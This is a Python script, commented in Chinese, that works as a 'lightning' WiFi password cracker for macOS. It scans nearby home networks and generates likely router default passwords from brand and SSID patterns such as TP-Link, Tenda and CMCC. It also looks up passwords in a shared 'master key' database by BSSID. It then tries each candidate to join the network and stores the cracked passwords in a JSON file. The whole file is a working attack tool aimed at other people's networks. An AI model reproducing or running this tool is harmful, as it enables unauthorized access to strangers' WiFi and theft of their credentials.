#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
闪电WiFi破解器 v1.0
核心思路：不走逐条密码爆破，用最聪明的方式秒级获取密码

两大模式：
  模式1: 默认密码计算器（秒级）
    - 根据品牌+SSID算出路由器默认密码（TP-Link/Tenda/MERCURY/CMCC/FAST等）
    - 每个目标只试5-20条最可能的默认密码
  模式2: 闪电扫射（每目标5-10秒）
    - 零延迟+超精准默认密码列表
    - 比字典爆破快10倍以上

适配：macOS Apple Silicon
"""

import argparse
import json
import re
import subprocess
import signal
import sys
import time
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_DIR = SCRIPT_DIR.parent
CAPTURES_DIR = PROJECT_DIR / "captures"
CRACKED_FILE = CAPTURES_DIR / "cracked.json"

# ============================================================
# 颜色常量
# ============================================================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"


# ============================================================
# 路由器默认密码生成规则
# ============================================================
# 中国家庭路由器默认密码规律：
#   TP-Link: 8位数字（常为MAC后8位或admin）
#   Tenda/腾达: admin 或 MAC后8位
#   MERCURY/水星: MAC后8位
#   CMCC移动: 8位数字（印在路由器底部）
#   中国电信ChinaNet: 8位数字
#   华为/荣耀: 随机8位字母数字（较难猜，但有规律）
#   小米: 纯数字或无密码
#   FAST/迅捷: 无密码或admin

def generate_default_passwords(ssid):
    """
    根据SSID智能生成该路由器最可能的默认密码列表
    返回: [(密码, 理由), ...]
    """
    candidates = []
    ssid_upper = ssid.upper()

    # ============================================================
    # 通用默认密码（适用于所有品牌）
    # ============================================================
    universal = [
        ("12345678", "最常见WiFi默认密码"),
        ("00000000", "8位零"),
        ("88888888", "8位8（中国吉利数字）"),
        ("11111111", "8位1"),
        ("66666666", "8位6"),
        ("123456789", "9位顺序数字"),
        ("1234567890", "10位顺序数字"),
        ("87654321", "8位逆序数字"),
        ("admin123", "admin+123"),
        ("password", "默认密码"),
        ("11223344", "AABB模式"),
    ]

    # ============================================================
    # TP-LINK 默认密码
    # ============================================================
    if "TP-LINK" in ssid_upper or "TP_LINK" in ssid_upper or "TPLINK" in ssid_upper:
        # 从SSID提取后缀（可能是MAC后4位）
        m = re.search(r'(?:TP[-_]?LINK)[-_]?([0-9A-Fa-f]{4,8})', ssid, re.IGNORECASE)
        if m:
            suffix = m.group(1).upper()
            # MAC后8位的各种组合
            candidates.append((suffix.lower() * 2 if len(suffix) == 4 else suffix.lower(), "TP-Link MAC后缀重复"))
            candidates.append(("tp" + suffix.lower() + "tp", "tp+MAC后缀+tp"))
            # 纯数字化MAC后缀
            for pad in ["0000", "1234", "8888"]:
                candidates.append((suffix.lower() + pad, "MAC后缀+数字填充"))
                candidates.append((pad + suffix.lower(), "数字填充+MAC后缀"))
        candidates.append(("admin1234", "TP-Link常见默认"))
        candidates.append(("tplink123", "品牌名+123"))

    # ============================================================
    # Tenda/腾达 默认密码
    # ============================================================
    elif "TENDA" in ssid_upper:
        m = re.search(r'TENDA[-_]?([0-9A-Fa-f]{4,8})', ssid, re.IGNORECASE)
        if m:
            suffix = m.group(1)
            candidates.append((suffix + suffix if len(suffix) == 4 else suffix, "Tenda MAC后缀"))
            candidates.append(("tenda" + suffix, "tenda+MAC后缀"))
        candidates.append(("12345678", "Tenda常见默认"))
        candidates.append(("tenda1234", "品牌名+1234"))

    # ============================================================
    # MERCURY/水星 默认密码
    # ============================================================
    elif "MERCURY" in ssid_upper:
        m = re.search(r'MERCURY[-_]?([0-9A-Fa-f]{4,8})', ssid, re.IGNORECASE)
        if m:
            suffix = m.group(1)
            candidates.append((suffix + suffix if len(suffix) == 4 else suffix, "MERCURY MAC后缀"))
            candidates.append(("mercury" + suffix, "mercury+MAC后缀"))
        candidates.append(("12345678", "MERCURY常见默认"))

    # ============================================================
    # FAST/迅捷 默认密码
    # ============================================================
    elif "FAST" in ssid_upper:
        m = re.search(r'FAST[-_]?([0-9A-Fa-f]{4,8})', ssid, re.IGNORECASE)
        if m:
            suffix = m.group(1)
            candidates.append((suffix + suffix if len(suffix) == 4 else suffix, "FAST MAC后缀"))
            candidates.append(("fast" + suffix, "fast+MAC后缀"))
        candidates.append(("12345678", "FAST常见默认"))

    # ============================================================
    # CMCC/中国移动 默认密码
    # ============================================================
    elif "CMCC" in ssid_upper:
        # CMCC-XXXX 后面的数字/字母可能暗示密码模式
        m = re.search(r'CMCC[-_]([A-Za-z0-9]+)', ssid, re.IGNORECASE)
        if m:
            suffix = m.group(1)
            # 纯数字后缀+填充到8位
            if suffix.isdigit():
                padded = suffix.ljust(8, "0")[:8]
                candidates.append((padded, "CMCC数字后缀填充"))
                candidates.append((suffix + suffix, "CMCC后缀重复"))
                candidates.append((suffix * 3, "CMCC后缀×3"))
                # CMCC路由器常见：后缀+8888等
                for tail in ["8888", "1234", "0000", "6666"]:
                    pwd = suffix + tail
                    if 8 <= len(pwd) <= 12:
                        candidates.append((pwd, "CMCC后缀+吉利数字"))
        # CMCC通用默认
        candidates.append(("cmcc1234", "CMCC默认1"))
        candidates.append(("cmcc12345678", "CMCC默认2"))
        candidates.append(("10086010", "移动客服号变体"))
        candidates.append(("10086100", "移动客服号变体2"))

    # ============================================================
    # ChinaNet/中国电信 默认密码
    # ============================================================
    elif "CHINANET" in ssid_upper:
        m = re.search(r'CHINANET[-_]([A-Za-z0-9]+)', ssid, re.IGNORECASE)
        if m:
            suffix = m.group(1)
            for tail in ["0000", "1234", "8888"]:
                pwd = suffix + tail
                if 8 <= len(pwd) <= 12:
                    candidates.append((pwd, "ChinaNet后缀+数字"))
        candidates.append(("10000000", "电信客服号"))
        candidates.append(("10001234", "电信客服+1234"))

    # ============================================================
    # 华为/HUAWEI 默认密码
    # ============================================================
    elif "HUAWEI" in ssid_upper:
        m = re.search(r'HUAWEI[-_]?([0-9A-Za-z]{4,8})', ssid, re.IGNORECASE)
        if m:
            suffix = m.group(1)
            candidates.append((suffix.lower(), "华为MAC后缀"))
            candidates.append(("huawei" + suffix[:4], "huawei+后缀"))
        candidates.append(("huawei123", "华为默认"))

    # ============================================================
    # 小米/Xiaomi 默认密码
    # ============================================================
    elif "XIAOMI" in ssid_upper or "REDMI" in ssid_upper or ssid_upper.startswith("MI_"):
        candidates.append(("12345678", "小米常见默认"))
        candidates.append(("xiaomi123", "品牌名+123"))

    # ============================================================
    # TOTOLINK 默认密码
    # ============================================================
    elif "TOTOLINK" in ssid_upper:
        m = re.search(r'TOTOLINK[-_]([A-Za-z0-9]+)', ssid, re.IGNORECASE)
        if m:
            suffix = m.group(1)
            candidates.append(("totolink" + suffix[:4], "totolink+型号"))
        candidates.append(("12345678", "TOTOLINK默认"))

    # ============================================================
    # 从SSID中提取可能的密码线索
    # ============================================================
    # SSID中的数字可能就是密码的一部分
    nums_in_ssid = re.findall(r'\d+', ssid)
    for num in nums_in_ssid:
        if len(num) >= 4:
            # 数字重复到8位
            repeated = (num * 3)[:8]
            candidates.append((repeated, "SSID数字重复填充"))
            # 数字+常见后缀
            for suf in ["0000", "1234", "8888", "1111"]:
                pwd = num + suf
                if 8 <= len(pwd) <= 12:
                    candidates.append((pwd, "SSID数字+后缀"))

    # 添加通用默认密码
    candidates.extend(universal)

    # 去重并过滤长度（WiFi密码至少8位）
    seen = set()
    result = []
    for pwd, reason in candidates:
        if pwd not in seen and len(pwd) >= 8:
            seen.add(pwd)
            result.append((pwd, reason))

    return result


# ============================================================
# WiFi连接尝试
# ============================================================
def try_connect(ssid, password, interface="en0"):
    """尝试WiFi连接，返回 (是否成功, 耗时)"""
    t0 = time.time()
    try:
        r = subprocess.run(
            ["networksetup", "-setairportnetwork", interface, ssid, password],
            capture_output=True, text=True, timeout=15
        )
        elapsed = time.time() - t0
        out = r.stdout + r.stderr
        if "Could not find" in out or "Error" in out or "Failed" in out:
            return False, elapsed
        time.sleep(0.3)
        chk = subprocess.run(
            ["networksetup", "-getairportnetwork", interface],
            capture_output=True, text=True, timeout=5
        )
        return ssid in chk.stdout, elapsed
    except Exception:
        return False, time.time() - t0


# ============================================================
# 获取目标列表
# ============================================================
def get_targets(interface="en0"):
    """获取周围WiFi目标列表"""
    # 优先用CoreWLAN扫描
    sys.path.insert(0, str(SCRIPT_DIR))
    targets = []

    try:
        from wifi_scanner import scan, estimate_password_strength
        nets, cur = scan()
        has_ssid = any(n.get("ssid", "") for n in nets) if nets else False

        if has_ssid:
            cracked = load_cracked()
            for n in nets:
                ssid = n.get("ssid", "")
                if not ssid or ssid in cracked:
                    continue
                if n.get("type", "") not in ("home", "unknown"):
                    continue
                strength = estimate_password_strength(ssid, n.get("security", ""))
                if strength["difficulty"] in ("无", "极高"):
                    continue
                targets.append({
                    "ssid": ssid,
                    "bssid": n.get("bssid", ""),
                    "rssi": n.get("rssi", -100),
                    "brand": strength["brand"],
                    "difficulty": strength["difficulty"],
                })
            if targets:
                return targets
    except ImportError:
        pass

    # 回退：已保存WiFi列表
    try:
        r = subprocess.run(
            ["networksetup", "-listpreferredwirelessnetworks", interface],
            capture_output=True, text=True, timeout=10
        )
        lines = r.stdout.strip().split("\n")
        cracked = load_cracked()
        skip_kw = ["eduroam", "ixaut", "snut", "iphone", "xiaomi", "huawei",
                    "oppo", "vivo", "redmi", "iqoo", "传康", "crazyk",
                    "hotel", "酒店", "passengers"]

        try:
            from wifi_scanner import estimate_password_strength
        except ImportError:
            def estimate_password_strength(ssid, sec=""):
                return {"brand": "未知", "difficulty": "中", "strategy": ""}

        for line in lines[1:]:
            ssid = line.strip()
            if not ssid or ssid in cracked:
                continue
            ssid_lower = ssid.lower()
            if any(kw in ssid_lower for kw in skip_kw):
                continue
            strength = estimate_password_strength(ssid)
            if strength["difficulty"] in ("无", "极高"):
                continue
            targets.append({
                "ssid": ssid,
                "bssid": "",
                "rssi": -60,
                "brand": strength["brand"],
                "difficulty": strength["difficulty"],
            })
    except Exception:
        pass

    # 按难度排序
    order = {"低": 0, "中": 1, "高": 2}
    targets.sort(key=lambda x: (order.get(x["difficulty"], 9), -x["rssi"]))
    return targets


def load_cracked():
    """加载已破解记录"""
    if CRACKED_FILE.exists():
        try:
            with open(CRACKED_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_cracked(ssid, password, source="lightning"):
    """保存破解结果"""
    CAPTURES_DIR.mkdir(parents=True, exist_ok=True)
    data = load_cracked()
    data[ssid] = {
        "password": password,
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "source": source,
    }
    with open(CRACKED_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


# ============================================================
# 闪电破解主流程
# ============================================================
def _query_masterkey_for_target(ssid, bssid, interface="en0"):
    """
    查询WiFi万能钥匙密码库，如果查到密码则直接测试连接
    返回: (是否成功, 密码) 或 (False, None)
    """
    if not bssid:
        return False, None
    try:
        sys.path.insert(0, str(SCRIPT_DIR))
        from wifi_db_query import query_wifi_masterkey
        pwd = query_wifi_masterkey(ssid, bssid)
        if pwd:
            # 查到密码，直接测试连接
            ok, _ = try_connect(ssid, pwd, interface)
            if ok:
                return True, pwd
        return False, None
    except ImportError:
        return False, None
    except Exception:
        return False, None


def lightning_crack(targets, interface="en0"):
    """
    闪电破解：万能钥匙预查 + 默认密码计算 + 零延迟扫射
    """
    total = len(targets)
    results = {"masterkey": [], "default_pwd": [], "failed": []}
    t_start = time.time()

    # 信号处理
    interrupted = [False]
    def on_int(sig, frame):
        interrupted[0] = True
        print(f"\n{YELLOW}[!] 用户中断{RESET}")
    old_handler = signal.signal(signal.SIGINT, on_int)

    print()
    print(f"{BOLD}{'=' * 60}")
    print(f"  闪电WiFi破解器 v2.0")
    print(f"  万能钥匙预查 | 默认密码计算 | 零延迟扫射")
    print(f"{'=' * 60}{RESET}")

    # ============================================================
    # 阶段0: WiFi万能钥匙密码库预查询（秒级）
    # ============================================================
    has_bssid = any(t.get("bssid") for t in targets)
    if has_bssid:
        print(f"{BOLD}{MAGENTA}")
        print(f"  ┌─────────────────────────────────────────────┐")
        print(f"  │  阶段0: WiFi万能钥匙密码库查询（秒级）       │")
        print(f"  └─────────────────────────────────────────────┘{RESET}")
        print()

        for idx, target in enumerate(targets):
            if interrupted[0]:
                break
            ssid = target["ssid"]
            bssid = target.get("bssid", "")
            if not bssid:
                continue

            cracked = load_cracked()
            if ssid in cracked:
                continue

            sys.stdout.write(f"\r  [{idx+1}/{total}] {ssid:<24} 查询万能钥匙...")
            sys.stdout.flush()

            ok, pwd = _query_masterkey_for_target(ssid, bssid, interface)
            if ok:
                save_cracked(ssid, pwd, "masterkey:万能钥匙密码库")
                results["masterkey"].append((ssid, pwd, "万能钥匙密码库"))
                print()
                print(f"  {GREEN}{BOLD}>>> 万能钥匙命中！SSID: {ssid}  "
                      f"密码: {pwd}{RESET}")
            else:
                sys.stdout.write(f"\r  [{idx+1}/{total}] {ssid:<24} 万能钥匙未收录\n")

        print()

    # ============================================================
    # 阶段1: 默认密码计算 + 零延迟扫射
    # ============================================================
    print(f"{BOLD}{CYAN}")
    print(f"  ┌─────────────────────────────────────────────┐")
    print(f"  │  阶段1: 默认密码计算 + 零延迟扫射            │")
    print(f"  │  每个目标仅试最可能的5-20条密码              │")
    print(f"  └─────────────────────────────────────────────┘{RESET}")
    print()

    success_count = len(results["masterkey"])
    for idx, target in enumerate(targets):
        if interrupted[0]:
            break

        ssid = target["ssid"]

        # 跳过已破解的（包括万能钥匙阶段已命中的）
        cracked = load_cracked()
        if ssid in cracked:
            continue

        # 生成该路由器最可能的默认密码
        default_pwds = generate_default_passwords(ssid)
        pwd_count = len(default_pwds)

        brand = target.get("brand", "未知")
        diff = target.get("difficulty", "中")

        sys.stdout.write(
            f"\r  [{idx+1}/{total}] {ssid:<24} ({brand}) "
            f"试{pwd_count}条默认密码..."
        )
        sys.stdout.flush()

        found = False
        for pwd_idx, (pwd, reason) in enumerate(default_pwds):
            if interrupted[0]:
                break

            ok, elapsed = try_connect(ssid, pwd, interface)
            if ok:
                found = True
                success_count += 1
                save_cracked(ssid, pwd, f"default_pwd:{reason}")
                results["default_pwd"].append((ssid, pwd, reason))
                print()
                print(f"  {GREEN}{BOLD}>>> 闪电命中！SSID: {ssid}  "
                      f"密码: {pwd}  原因: {reason}{RESET}")
                break

        if not found and not interrupted[0]:
            results["failed"].append(ssid)
            sys.stdout.write(
                f"\r  [{idx+1}/{total}] {ssid:<24} ({brand}) "
                f"- 未命中 ({pwd_count}条)          \n"
            )

    signal.signal(signal.SIGINT, old_handler)

    # ============================================================
    # 最终报告
    # ============================================================
    total_time = time.time() - t_start
    print()
    print(f"{BOLD}{'=' * 60}")
    print(f"  闪电破解 - 最终报告")
    print(f"{'=' * 60}{RESET}")
    print(f"  总目标: {total}")
    print(f"  总耗时: {total_time:.0f}s ({total_time/60:.1f}分钟)")
    print()

    # 默认密码命中
    if results["default_pwd"]:
        print(f"  {GREEN}{BOLD}[默认密码] 命中 {len(results['default_pwd'])} 个:{RESET}")
        for ssid, pwd, reason in results["default_pwd"]:
            print(f"    {ssid:<28} {pwd:<20} ({reason})")
        print()

    # 万能钥匙命中
    if results["masterkey"]:
        print(f"  {GREEN}{BOLD}[万能钥匙] 命中 {len(results['masterkey'])} 个:{RESET}")
        for ssid, pwd, reason in results["masterkey"]:
            print(f"    {ssid:<28} {pwd:<20} ({reason})")
        print()

    total_hit = len(results["default_pwd"]) + len(results["masterkey"])
    if total_hit > 0:
        print(f"  {GREEN}{BOLD}总命中: {total_hit} 个WiFi密码已获取！{RESET}")
        print(f"  密码已保存到: {CRACKED_FILE}")
    else:
        print(f"  {YELLOW}本次未命中（目标路由器可能已修改默认密码）{RESET}")
        print(f"  建议：")
        print(f"    1. 使用完整字典破解: python3 scripts/batch_crack.py --depth full")
        print(f"    2. 使用社工字典:     python3 scripts/smart_dict.py")
        print(f"    3. 使用hashcat离线:  python3 scripts/hashcat_helper.py smart")

    print(f"{'=' * 60}")


# ============================================================
# 入口
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="闪电WiFi破解器 v1.0")
    parser.add_argument("-i", "--interface", default="en0", help="WiFi接口")
    parser.add_argument("--targets", nargs="+", help="手动指定目标SSID")
    parser.add_argument("--show-default-pwds", type=str,
                        help="显示指定SSID的默认密码列表（不执行攻击）")
    parser.add_argument("--show-cracked", action="store_true",
                        help="显示所有已破解的WiFi")
    args = parser.parse_args()

    # 显示已破解记录
    if args.show_cracked:
        cracked = load_cracked()
        if not cracked:
            print("  暂无破解记录")
        else:
            print(f"\n  {GREEN}{BOLD}已破解的WiFi ({len(cracked)}个):{RESET}")
            print(f"  {'SSID':<28} {'密码':<24} {'来源':<16} {'时间'}")
            print(f"  {'-' * 85}")
            for ssid, info in cracked.items():
                pwd = info.get("password", "?")
                src = info.get("source", "N/A")
                t = info.get("time", "N/A")
                print(f"  {ssid:<28} {pwd:<24} {src:<16} {t}")
        return

    # 显示默认密码列表
    if args.show_default_pwds:
        ssid = args.show_default_pwds
        pwds = generate_default_passwords(ssid)
        print(f"\n  SSID: {ssid}")
        print(f"  默认密码候选 ({len(pwds)}条):")
        print(f"  {'#':>3} {'密码':<24} {'理由'}")
        print(f"  {'-' * 50}")
        for i, (pwd, reason) in enumerate(pwds, 1):
            print(f"  {i:>3} {pwd:<24} {reason}")
        return

    # 获取目标
    if args.targets:
        sys.path.insert(0, str(SCRIPT_DIR))
        try:
            from wifi_scanner import estimate_password_strength
        except ImportError:
            def estimate_password_strength(ssid, sec=""):
                return {"brand": "未知", "difficulty": "中", "strategy": ""}
        targets = []
        for ssid in args.targets:
            s = estimate_password_strength(ssid)
            targets.append({
                "ssid": ssid, "rssi": -50,
                "brand": s["brand"], "difficulty": s["difficulty"],
            })
    else:
        targets = get_targets(args.interface)

    if not targets:
        print(f"\n  {YELLOW}没有可攻击的目标{RESET}")
        return

    # 显示目标
    print(f"\n  {BOLD}发现 {len(targets)} 个目标{RESET}")
    for i, t in enumerate(targets[:20], 1):
        pwds = generate_default_passwords(t["ssid"])
        print(f"    {i:>3}. {t['ssid']:<24} {t['brand']:<8} "
              f"默认密码{len(pwds)}条")
    if len(targets) > 20:
        print(f"    ... 还有 {len(targets) - 20} 个")

    # 执行闪电破解
    lightning_crack(
        targets=targets,
        interface=args.interface,
    )


if __name__ == "__main__":
    main()
